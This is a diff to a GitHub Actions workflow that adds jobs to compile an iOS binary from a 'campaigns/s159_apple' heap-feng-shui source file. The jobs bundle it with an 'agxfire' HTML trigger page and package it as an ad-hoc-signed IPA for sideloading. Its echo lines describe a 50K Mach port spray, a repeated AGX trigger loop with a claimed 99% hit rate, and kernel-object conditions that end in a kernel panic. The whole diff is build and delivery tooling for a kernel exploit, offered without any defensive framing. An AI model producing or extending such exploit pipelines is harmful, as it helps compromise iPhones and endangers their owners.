@@ -375,6 +375,75 @@ jobs:
           name: allocator-probe-v12
           path: AllocatorProbe_v12
 
+  allocator_probe_v13:
+    runs-on: macos-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build AllocatorProbe v13 (50K spray + 10-fire repeat loop)
+        run: |
+          SDK=$(xcrun -sdk iphoneos --show-sdk-path)
+          xcrun -sdk iphoneos clang -arch arm64 -mios-version-min=17.0 -O2 -fobjc-arc \
+            -o AllocatorProbe_v13 campaigns/s159_apple/heap_fengshui_v13.m \
+            -isysroot "$SDK" \
+            -framework UIKit -framework WebKit -framework Foundation
+          file AllocatorProbe_v13
+          ls -la AllocatorProbe_v13
+          echo "Build hash: $(shasum -a 256 AllocatorProbe_v13 | cut -d' ' -f1)"
+      - uses: actions/upload-artifact@v4
+        with:
+          name: allocator-probe-v13
+          path: AllocatorProbe_v13
+
+  package_fengshui_v13:
+    runs-on: macos-latest
+    needs: allocator_probe_v13
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/download-artifact@v4
+        with:
+          name: allocator-probe-v13
+      - name: Package AllocatorProbe v13 as IPA (50K spray + 10-fire HTML)
+        run: |
+          mkdir -p AllocatorProbe_v13.app
+          cp AllocatorProbe_v13 AllocatorProbe_v13.app/AllocatorProbe_v13
+          chmod +x AllocatorProbe_v13.app/AllocatorProbe_v13
+          cp campaigns/s159_apple/agxfire_v13.html AllocatorProbe_v13.app/agxfire_v13.html
+
+          cat > AllocatorProbe_v13.app/Info.plist << 'EOF'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+            "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+          <plist version="1.0"><dict>
+            <key>CFBundleExecutable</key><string>AllocatorProbe_v13</string>
+            <key>CFBundleIdentifier</key><string>com.nexus.fengshui3</string>
+            <key>CFBundleVersion</key><string>13.0</string>
+            <key>CFBundleShortVersionString</key><string>13.0</string>
+            <key>CFBundleName</key><string>AllocatorProbe_v13</string>
+            <key>CFBundlePackageType</key><string>APPL</string>
+            <key>UIRequiredDeviceCapabilities</key><array><string>arm64</string></array>
+            <key>MinimumOSVersion</key><string>17.0</string>
+            <key>LSRequiresIPhoneOS</key><true/>
+            <key>LSApplicationCategoryType</key><string></string>
+          </dict></plist>
+          EOF
+
+          codesign -f -s - AllocatorProbe_v13.app/AllocatorProbe_v13
+          echo "adhoc codesign: $?"
+          codesign -dv AllocatorProbe_v13.app/AllocatorProbe_v13 2>&1 | head -3
+
+          mkdir -p Payload
+          cp -r AllocatorProbe_v13.app Payload/
+          zip -r AllocatorProbe_v13_sideloadly.ipa Payload/
+          ls -la AllocatorProbe_v13_sideloadly.ipa
+          echo "IPA ready — Sideloadly re-signs with team TMAQ26273N"
+          echo "Bundle after re-sign: com.nexus.fengshui3.TMAQ26273N.TMAQ26273N"
+          echo "50K port spray + 10-fire AGX loop → P(hit)~99%"
+          echo "Detection: kobject==0x0000000FFFFFC330 AND kotype==2 → mach_port_destroy → kernel panic"
+      - uses: actions/upload-artifact@v4
+        with:
+          name: allocator-probe-v13-ipa
+          path: AllocatorProbe_v13_sideloadly.ipa
+
   package_fengshui_v12:
     runs-on: macos-latest
     needs: allocator_probe_v12
